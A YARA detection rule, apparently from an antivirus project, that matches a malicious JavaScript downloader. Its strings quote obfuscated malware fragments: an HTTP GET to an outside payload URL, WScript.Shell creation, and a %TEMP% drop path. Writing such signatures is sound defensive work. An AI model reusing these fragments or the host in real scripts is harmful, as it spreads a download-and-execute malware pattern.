rule sig_20160427_3b2cd768c153a07f5a5df250ee3a41e6 {
  meta:
    description = "datamaliciousorder - file 20160427_3b2cd768c153a07f5a5df250ee3a41e6.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ad52b63a6aa7262c163e098e6fb64bc421b2f90a11211f8d848a9288cd90b54b"

  strings:
    $s1  = "MalzjYvyfn[LymdmJonbb](\"G\" + \"ET\", \"http://aaacollectionsjewelry.com/ur8fgs\", false);" fullword ascii
    $s2  = "function WpqlkEddfc() {return ZkwxmVuogc[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"M9XcEXe" ascii
    $s3  = "function WpqlkEddfc() {return ZkwxmVuogc[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"M9XcEXe" ascii
    $s4  = "var ZkwxmVuogc = function EmotwTwyyh() {return WcyobTzxgu[LzbceHtdof](\"WScript\"+\".Shell\");}(), IxhebHaipy = 11;" fullword ascii
    $s5  = "function WmxnpIszwh(PswmrUpnob, XtqpnCenld){UwdrrYmdxg = UwdrrYmdxg * 1; return PswmrUpnob - XtqpnCenld;};" fullword ascii
    $s6  = "var WcyobTzxgu = this[\"WScript\"];" fullword ascii
    $s7  = "if (MalzjYvyfn[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function EljeqAhbwn(){return ZdhpsPhkkx + \"\";};" fullword ascii
    $s9  = "function OfkucXnbdq() {return ((UmkkfRwxko == true) && (UmkkfRwxko == ZnnjyHgxkj)) ? 1 : UwdrrYmdxg;};" fullword ascii
    $s10 = "UmkkfRwxko = true; " fullword ascii
    $s11 = "function NprcjXronl(QuwoxHnhze) {var AbrqkNqhqq = (1, 2, 3, 4, 5, QuwoxHnhze); return AbrqkNqhqq;};" fullword ascii
    $s12 = "var ZnnjyHgxkj = false;" fullword ascii
    $s13 = "var VojpyMhgdo = new this[\"D\"+\"ate\"]();" fullword ascii
    $s14 = "var UmkkfRwxko = false;" fullword ascii
    $s15 = "var RygptYhevd = false;" fullword ascii
    $s16 = "return WmxnpIszwh(WkpcmGvxke, TbkzwYxdgn);" fullword ascii
    $s17 = "}while (XwwndMkslt);" fullword ascii
    $s18 = "RygptYhevd = true;" fullword ascii
    $s19 = "function PbhbyBcrhj(){return 23;};" fullword ascii
    $s20 = "function BjcprGhrpo()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}